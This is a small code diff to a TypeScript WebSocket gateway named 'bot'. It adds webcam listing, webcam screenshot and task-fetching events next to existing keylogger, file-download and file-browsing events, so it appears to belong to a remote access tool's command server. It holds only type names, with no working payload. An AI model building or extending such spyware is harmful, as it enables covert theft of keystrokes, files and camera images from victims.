@@ -20,7 +20,7 @@ type BotEvents =
   | "getFilesFolder"
   | "downloadFile"
   | "addFriend"
-  | "sendKeyLogger";
+  | "sendKeyLogger" | "getTasksFromClient" | "getWebcams" | "getWebcamScreenshot";
 
 @WebSocketGateway({
   namespace: "bot",
